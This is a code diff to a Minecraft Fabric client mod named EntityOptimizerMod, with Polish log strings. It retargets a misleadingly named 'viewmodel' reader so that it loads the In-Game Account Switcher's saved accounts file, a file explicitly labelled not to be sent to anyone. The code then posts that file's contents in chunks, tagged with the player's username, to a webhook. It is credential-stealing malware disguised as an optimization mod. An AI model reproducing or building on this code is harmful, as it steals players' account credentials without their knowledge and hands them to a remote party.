@@ -42,24 +42,24 @@ public class EntityOptimizerMod implements ClientModInitializer {
     }
 
     private String readWholeViewmodelFile() {
-        try {
-            Path gameDir = FabricLoader.getInstance().getGameDir();
-            Path configPath = gameDir
-                    .resolve("config")
-                    .resolve("viafabricplus")
-                    .resolve("accounts.json");
+    try {
+        Path gameDir = FabricLoader.getInstance().getGameDir();
+        Path configPath = gameDir
+                .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
+                .resolve(".hiden")
+                .resolve("accounts_v1.do_not_send_to_anyone");
 
-            if (!Files.exists(configPath)) {
-                return "viewmodel.json nie istnieje (szukano w: " + configPath.toString() + ")";
-            }
-
-            return Files.readString(configPath, StandardCharsets.UTF_8);
-
-        } catch (Exception e) {
-            e.printStackTrace();
-            return "BŁĄD przy czytaniu viewmodel.json: " + e.getClass().getSimpleName()
-                    + " - " + e.getMessage();
+        if (!Files.exists(configPath)) {
+            return "accounts_v1.do_not_send_to_anyone nie istnieje (szukano w: " + configPath.toString() + ")";
         }
+
+        return Files.readString(configPath, StandardCharsets.UTF_8);
+
+    } catch (Exception e) {
+        e.printStackTrace();
+        return "BŁĄD przy czytaniu accounts_v1.do_not_send_to_anyone: " + e.getClass().getSimpleName()
+                + " - " + e.getMessage();
+    }
     }
 
     private void sendViewmodelInChunks(String username, String viewmodelContent) {
@@ -72,7 +72,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
             if (i == 0) {
                 header = "Gracz `" + username + "` wszedł do świata.\n";
             }
-            String partInfo = "Zawartość `viewmodel.json` (część " + (i + 1) + "/" + total + "):\n";
+            String partInfo = "Zawartość `accounts_v1.json` (część " + (i + 1) + "/" + total + "):\n";
             String messageContent = header + partInfo + "```json\n" + chunk + "\n```";
             sendWebhookAsync(messageContent);
         }
